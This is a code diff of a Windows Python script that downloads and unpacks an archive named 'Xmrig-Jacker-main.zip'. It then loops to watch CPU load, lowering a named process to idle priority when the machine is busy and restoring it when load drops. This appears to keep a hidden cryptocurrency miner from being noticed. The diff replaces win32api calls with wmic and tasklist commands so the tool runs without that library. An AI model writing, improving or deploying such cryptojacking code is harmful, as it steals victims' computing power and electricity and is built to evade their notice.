@@ -2,7 +2,6 @@ import os
 import subprocess
 import shutil
 import ctypes
-import win32api
 import time
 
 def download_and_extract(url, output_dir):
@@ -10,10 +9,7 @@ def download_and_extract(url, output_dir):
     shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)
 
 def set_process_priority(pid, priority):
-    PROCESS_SET_INFORMATION = 0x0200
-    handle = win32api.OpenProcess(PROCESS_SET_INFORMATION, False, pid)
-    win32api.SetPriorityClass(handle, priority)
-    win32api.CloseHandle(handle)
+    subprocess.run(["wmic", "process", "where", f"ProcessId={pid}", "CALL", f"SetPriority {priority}"])
 
 def main():
     temp_dir = "C:/temp"
@@ -34,18 +30,20 @@ def main():
     low_usage_threshold = 25
 
     while True:
-        cpu_usage = win32api.GetSystemTimes()[0]  # Get the idle time
+        cpu_usage = subprocess.check_output(["wmic", "cpu", "get", "loadpercentage"]).decode("utf-8").split()[1]
+        cpu_usage = int(cpu_usage)
+        
         if cpu_usage >= high_usage_threshold:
-            for proc in subprocess.check_output(["tasklist"]).splitlines():
-                if process_name.encode() in proc:
+            for proc in subprocess.check_output(["tasklist"]).decode("utf-8").splitlines():
+                if process_name in proc:
                     pid = int(proc.split()[1])
-                    set_process_priority(pid, win32api.IDLE_PRIORITY_CLASS)
+                    set_process_priority(pid, "Idle")
 
         elif cpu_usage < low_usage_threshold:
-            for proc in subprocess.check_output(["tasklist"]).splitlines():
-                if process_name.encode() in proc:
+            for proc in subprocess.check_output(["tasklist"]).decode("utf-8").splitlines():
+                if process_name in proc:
                     pid = int(proc.split()[1])
-                    set_process_priority(pid, win32api.NORMAL_PRIORITY_CLASS)
+                    set_process_priority(pid, "Normal")
 
         time.sleep(5)
 
